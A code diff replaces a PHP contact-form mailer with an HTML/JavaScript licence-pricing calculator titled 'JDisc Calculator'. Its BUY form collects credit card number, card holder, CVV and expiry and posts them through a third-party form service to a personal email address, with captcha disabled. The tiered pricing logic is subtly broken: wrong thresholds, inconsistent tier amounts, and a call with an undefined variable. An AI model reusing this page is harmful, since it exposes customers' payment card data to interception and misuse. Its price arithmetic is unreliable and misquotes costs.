@@ -1,60 +1,522 @@
-<?php
-if(!isset($_POST['submit']))
-{
-	//This page should not be accessed directly. Need to submit the form.
-	echo "error; you need to submit the form!";
-}
-$name = $_POST['name'];
-$visitor_email = $_POST['email'];
-$company = $_POST['company'];
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/x-icon" href="assets/jdisc.png">
+    <link rel="stylesheet" href="styles/style.css">
+    <title>JDisc Calculator</title>
 
-//Validate first
-if(empty($name)||empty($visitor_email)) 
-{
-    echo "Name and email are mandatory!";
-    exit;
+</head>
+<style>
+ * {
+  box-sizing: border-box;
 }
-
-if(IsInjected($visitor_email))
-{
-    echo "Bad email value!";
-    exit;
+.divrow {
+  display: flex;
 }
 
-$email_from = 'antonis-9@live.de';//<== update the email address
-$email_subject = "New Form submission";
-$email_body = "You have received a new message from the user $name.\n".
-    "Here is the message:\n $company".
-    
-$to = $visitor_email;//<== update the email address
-$headers = "From: $email_from \r\n";
-$headers .= "Reply-To: $visitor_email \r\n";
-//Send the email!
-mail($to,$email_subject,$email_body,$headers);
-         
+.divcolumn {
+  flex: 50%;
+}
+/* Container for flexboxes */
+.row {
+  display: flex;
+  flex-wrap: wrap;
+}
 
+/* Create four equal columns */
+.column {
+  flex: 25%;
+  padding: 20px;
+  box-shadow: 0px 0px 15px 3px #82f4ff;
+  background-color:rgba(130, 220, 255, 0.281);
 
-// Function to validate against any email injection attempts
-function IsInjected($str)
-{
-  $injections = array('(\n+)',
-              '(\r+)',
-              '(\t+)',
-              '(%0A+)',
-              '(%0D+)',
-              '(%08+)',
-              '(%09+)'
-              );
-  $inject = join('|', $injections);
-  $inject = "/$inject/i";
-  if(preg_match($inject,$str))
-    {
-    return true;
-  }
-  else
-    {
-    return false;
+}
+.column2 {
+  flex: 25%;
+  padding: 20px;
+  background-color:rgba(116, 214, 253, 0.089);
+}
+
+/* On screens that are 992px wide or less, go from four columns to two columns */
+@media screen and (max-width: 992px) {
+  .column, .column2 {
+    flex: 50%;
   }
 }
+
+/* On screens that are 600px wide or less, make the columns stack on top of each other instead of next to each other */
+@media screen and (max-width: 600px) {
+  .row {
+    flex-direction: column;
+  }
+}
+.select-box{
+  width: 200px;
+}
+.span-class{
+  line-height: 3.0;
+}
+.right{
+  text-align: right;
+}
+.button-green {
+  background-color: #13aa52;
+  border: 1px solid #13aa52;
+  border-radius: 4px;
+  box-shadow: rgba(0, 0, 0, .1) 0 2px 4px 0;
+  box-sizing: border-box;
+  color: #fff;
+  cursor: pointer;
+  font-family: "Akzidenz Grotesk BQ Medium", -apple-system, BlinkMacSystemFont, sans-serif;
+  font-size: 16px;
+  font-weight: 400;
+  outline: none;
+  outline: 0;
+  padding: 10px 25px;
+  text-align: center;
+  transform: translateY(0);
+  transition: transform 150ms, box-shadow 150ms;
+  user-select: none;
+  -webkit-user-select: none;
+  touch-action: manipulation;
+}
+
+.button-green:hover {
+  box-shadow: rgba(0, 0, 0, .15) 0 3px 9px 0;
+  transform: translateY(-2px);
+}
+
+@media (min-width: 768px) {
+  .button-green {
+    padding: 10px 30px;
+  }
+}
+.button-blue {
+  background-color: #002394;
+  border: 1px solid #002394;
+  border-radius: 4px;
+  box-shadow: rgba(0, 0, 0, .1) 0 2px 4px 0;
+  box-sizing: border-box;
+  color: #fff;
+  cursor: pointer;
+  font-family: "Akzidenz Grotesk BQ Medium", -apple-system, BlinkMacSystemFont, sans-serif;
+  font-size: 16px;
+  font-weight: 400;
+  outline: none;
+  outline: 0;
+  padding: 10px 25px;
+  text-align: center;
+  transform: translateY(0);
+  transition: transform 150ms, box-shadow 150ms;
+  user-select: none;
+  -webkit-user-select: none;
+  touch-action: manipulation;
+}
+
+.button-blue:hover {
+  box-shadow: rgba(0, 0, 0, .15) 0 3px 9px 0;
+  transform: translateY(-2px);
+}
+
+@media (min-width: 768px) {
+  .button-blue {
+    padding: 10px 30px;
+  }
+}
+.input-class{
+  line-height: 0.5;
+}
+
    
-?> 
+</style>
+<body>
+<div class="row">
+    <div class="column">
+        <h2>Enter how many devices you want:</h2>
+      
+        <h4>Device1</h4>
+        <div>
+            <input
+            type="number"
+            id="dev1"
+            min="0"
+            step="1"
+            placeholder="20 Credits Per Device"
+            onchange="Calculator()"
+            onkeyup="if(this.value<0){this.value= this.value * -1}"
+          />
+        </div>
+
+        <h4>Device2</h4>
+        <div>
+            <input
+            type="number"
+            id="dev2"
+            min="0"
+            step="1"
+            placeholder="12 Credits Per Device"
+            onchange="Calculator()"
+            onkeyup="if(this.value<0){this.value= this.value * -1}"
+          />           
+        </div>
+
+        <h4>Device3</h4>
+        <div>
+            <input
+            type="number"
+            id="dev3"
+            min="0"
+            step="1"
+            placeholder="06 Credits Per Device"
+            onchange="Calculator()"
+            onkeyup="if(this.value<0){this.value= this.value * -1}"
+          />
+        </div>
+
+        <h4>Device4</h4>
+        <div>
+            <input
+            type="number"
+            id="dev4"
+            min="0"
+            step="1"
+            placeholder="04 Credits Per Device"
+            onchange="Calculator()"
+            onkeyup="if(this.value<0){this.value= this.value * -1}"
+        
+          />
+        </div>
+        <h4>Select the Add-Ons you would like to purchase:</h4>
+        <div>
+            <input type="checkbox" id="add1" onclick="Calculator()" class="home-checkbox" />ADDON1
+        </div>
+
+        <div>
+            <input type="checkbox" id="add2" onclick="Calculator()" class="home-checkbox1" />ADDON2
+        </div>
+
+        <div>
+            <input type="checkbox" id="add3" onclick="Calculator()" class="home-checkbox2" />ADDON3
+        </div>
+
+        <div>
+            <input type="checkbox" id="add4" onclick="Calculator()" class="home-checkbox3" />ADDON4
+        </div>
+
+        <div>
+            <input type="checkbox" id="add5" onclick="Calculator()" class="home-checkbox4" />ADDON5
+        </div>
+
+        <h4>Select your currency:</h4>
+        <select class="select-box" id="selectcurrency" onchange="Calculator()">
+          <option value="eur">Euro</option>
+          <option value="usd">USD</option>
+          <option value="gbp">GBP</option>
+        </select>
+      
+    </div>
+      
+        <div class="column">
+            <h2>Total Summary:</h2>
+            <div class="divrow">
+                <div class="divcolumn">
+                    <span class="span-class">Total Devices:</span>
+                </div>
+                <div class="divcolumn right">
+                    <span class="span-class"  id="devices">0</span>
+                </div>
+            </div>  
+            
+            <div class="divrow">
+                <div class="divcolumn">
+                    <span class="span-class">Total Credits Requiered:</span>
+                </div>
+                <div class="divcolumn right">
+                    <span class="span-class"  id="tokens">0</span>
+                </div>
+            </div> 
+
+            <div class="divrow">
+                <div class="divcolumn">
+                    <span class="span-class">Total Cost For License <span>(One Time Payment)</span>:</span>
+                </div>
+                <div class="divcolumn right">
+                    <span class="span-class"  id="licensecost">0</span>
+                </div>
+            </div>    
+    
+            <div class="divrow">
+                <div class="divcolumn">
+                    <span class="span-class">Support (Annual Cost For Ongoing Support):</span>
+                </div>
+                <div class="divcolumn right">
+                    <span class="span-class"  id="annualsub">0</span>  
+                </div>
+            </div>    
+
+            <div class="divrow">
+                <div class="divcolumn">
+                    <span class="span-class">Total Cost:</span>
+                </div>
+                <div class="divcolumn right">
+                    <span class="span-class" id="final">0</span>                   
+                </div>
+            </div>
+      
+
+          <input class="button-green" type="submit" value="SUBMIT" onclick="showdiv(this.value)"></input>
+          <input class="button-blue" type="submit" value="BUY" onclick="showdiv(this.value)"></input>
+
+
+            <div class="column2" style="display:none;" id="formdiv">
+                <form method="post" name="myemailform" action="https://formsubmit.co/antonis-9@live.de">
+
+                    <h2>Contact Details</h2>
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_next" value="https://vibrant-brown.185-207-107-69.plesk.page">
+                    <div>
+                        <input
+                        type="text"
+                        placeholder="Name*"
+                        name="name"
+                        />
+                    </div>
+                    <br>
+                    <div>
+                        <input
+                        type="text"
+                        placeholder="E-Mail*"
+                        name="email"
+                        />
+                    </div>
+                    <br>
+                    <div>
+                        <input
+                        type="text"
+                        placeholder="Company*"
+                        name="company"
+                        />
+                    </div>
+                    <br>
+                    <div>
+                        <input
+                        type="text"
+                        placeholder="Telephone Number"
+                        name="tel"
+                        />
+                    </div>
+                    <br>
+                    <span class="span-class">If you submit the form by clicking &quot;SUBMIT&quot;, you agree with our</span>
+                    <a
+                        href="https://example.com"
+                        target="_blank"
+                        rel="noreferrer noopener"
+                        class="home-link"
+                        >
+                        terms of use
+                    </a>
+                    .
+                    <br>
+                    <div>
+                        <input class="button-green" type="submit" name='submit' value="SUBMIT">
+                    </div>
+                </form>
+            </div>
+            <div class="column2" style="display:none;" id="buydiv">
+                <form method="post" name="myemailform" action="https://formsubmit.co/antonis-9@live.de">
+
+                    <h2>Payment Details</h2>
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_next" value="https://vibrant-brown.185-207-107-69.plesk.page">
+                    <div>
+                        <input
+                        type="text"
+                        placeholder="Credit Card Number*"
+                        name="number"
+                        />
+                    </div>
+                    <br>
+                    <div>
+                        <input
+                        type="text"
+                        placeholder="Card Holder*"
+                        name="name"
+                        />
+                    </div>
+                    <br>
+                    <div>
+                        <input
+                        type="text"
+                        placeholder="CVV*"
+                        name="cvv"
+                        />
+                    </div>
+                    <br>
+                    <div>
+                        <input
+                        type="text"
+                        placeholder="Expire Date*"
+                        name="exp"
+                        />
+                    </div>
+                    <br>
+                    <span class="span-class">If you hit BUY, you agree with our</span>
+                    <a
+                        href="https://example.com"
+                        target="_blank"
+                        rel="noreferrer noopener"
+                        class="home-link"
+                        >
+                        terms of use
+                    </a>
+                    .
+                    <br>
+                    <div>
+                        <input class="button-blue" type="submit" name='submit' value="BUY">
+                    </div>
+                </form>            
+            </div>
+    </div>
+</div>
+      
+    <script type="text/javascript">
+        function showdiv(val){
+            if (val=="SUBMIT") {
+                document.getElementById('formdiv').style.display = "block";
+            }
+            else
+                document.getElementById('formdiv').style.display = "none";
+            if (val=="BUY") {
+                document.getElementById('buydiv').style.display = "block";
+            }
+            else
+            document.getElementById('buydiv').style.display = "none";
+            console.log(val);
+        }
+        showdiv(val);
+        function Calculator(){
+            // Get Devices
+            var x = document.getElementById('dev1').value*1;
+            var y = document.getElementById('dev2').value*1;
+            var z = document.getElementById('dev3').value*1;
+            var a = document.getElementById('dev4').value*1;
+            // End Get Devices
+
+            // Calculate Devices
+            document.getElementById('devices').innerHTML = x+y+z+a;
+            // End Calculate Devices
+
+            // Calculate Tokens INDIVIDUAL
+            x = x*20;
+            y = y*12;
+            z = z*6;
+            a = a*4;
+            // End Calculate Tokens INDIVIDUAL
+
+            // Get How Many ADDONS
+            var cb1 = document.getElementById('add1');
+            var cb2 = document.getElementById('add2');
+            var cb3 = document.getElementById('add3');
+            var cb4 = document.getElementById('add4');
+            var cb5 = document.getElementById('add5');
+            // End Get How Many ADDONS
+
+            // Counter How Many ADDONS Selected
+            var count = 0;
+            // END Counter How Many ADDONS Selected
+
+            // Addons Counter
+            if(cb1.checked == true || cb2.checked == true || cb3.checked == true || cb4.checked == true || cb5.checked == true){
+                if (cb1.checked == true){
+                    count = count+1;
+                }
+                if (cb2.checked == true){
+                    count = count+1;
+                }
+                if (cb3.checked == true){
+                    count = count+1;
+                }
+                if (cb4.checked == true){
+                    count = count+1;
+                }
+                if (cb5.checked == true){
+                    count = count+1;
+                }
+                let sum = x+y+z+a;
+                var procentage = sum * 0.3;
+                var extratokens = count * procentage;
+                var totaltokens = sum + extratokens;
+
+                document.getElementById('tokens').innerHTML = totaltokens;
+            // End Addons Counter
+
+            // Tokens Without ADDONS 
+            }else{
+            totaltokens = x+y+z+a;
+            document.getElementById('tokens').innerHTML = totaltokens;
+            }
+            // End Tokens Without ADDONS
+
+            // Stair Cost Calculator
+            var cost = 0;
+            if (totaltokens>0 && totaltokens<=1000) {
+                cost = (totaltokens*1.1);
+            }
+            else if (totaltokens>1000 && totaltokens<=3000) {
+                cost = ((1000*1.1)+(totaltokens-1000)*0.99);
+            } 
+            else if (totaltokens>3000 && totaltokens<=5000) {
+                cost = ((1000*1.1)+(2000*0.99)+(totaltokens-3000)*0.88);
+            }
+            else if (totaltokens>5000 && totaltokens<=10000) {
+                cost = ((1000*1)+(2000*0.99)+(2000*0.88)+(totaltokens-5000)*0.77);
+            }
+            else if (totaltokens>1000 && totaltokens<=15000) {
+                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(5000*0.77)+(totaltokens-1000)*0.66);
+            }
+            else if (totaltokens>15000 && totaltokens<=1000000) {
+                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(50000*0.77)+(5000*0.66)+(totaltokens-15000)*0.55);
+            }
+            else if (totaltokens>100000 && totaltokens<=1000000) {
+                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(50000*0.77)+(5000*0.66)+(85000*0.55)+(totaltokens-100000)*0.44);
+            }
+            else if (totaltokens>1000000 && totaltokens<=2000000) {
+                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(50000*0.77)+(5000*0.66)+(85000*0.55)+(900000*0.44)+(totaltokens-1000000)*0.33);
+            }
+            else if (totaltokens>2000000 && totaltokens<=5000000) {
+                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(50000*0.77)+(5000*0.66)+(85000*0.55)+(900000*0.44)+(1000000*0.33)+(totaltokens-2000000)*0.22);
+            }
+            else if (totaltokens>5000000){
+                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(50000*0.77)+(5000*0.66)+(85000*0.55)+(900000*0.44)+(1000000*0.33)+(3000000)*0.22+(totaltokens-5000000)*0.11);
+            }
+            // End Stair Cost Calculator
+
+            // Currency Converter
+            var currency = document.getElementById('selectcurrency').value;
+            var finalcost = cost+(cost*0.2)
+            if (currency=='eur'){
+                document.getElementById('licensecost').innerHTML = '€' + " " + cost.toFixed(2);
+                document.getElementById('annualsub').innerHTML = '€' + " " + (cost*0.2).toFixed(2);
+                document.getElementById('final').innerHTML =  '€' + " " + finalcost.toFixed(2);
+
+
+            }else if (currency=='usd') {
+                document.getElementById('licensecost').innerHTML = '$' + " " + (cost*0.96).toFixed(2);
+                document.getElementById('annualsub').innerHTML = '$' + " " + ((cost*0.2)*0.96).toFixed(2);
+                document.getElementById('final').innerHTML =  '$' + " " + (finalcost*0.96).toFixed(2);
+
+
+            }else if (currency=='gbp') {
+                document.getElementById('licensecost').innerHTML = '£' + " " + (cost*0.9).toFixed(2);
+                document.getElementById('annualsub').innerHTML = '£' + " " + ((cost*0.2)*0.9).toFixed(2);
+                document.getElementById('final').innerHTML =  '£' + " " + (finalcost*0.9).toFixed(2);
+
+            }
+            // End Currence Converter
+        }
+    </script>
+
+      </body>
+</html>
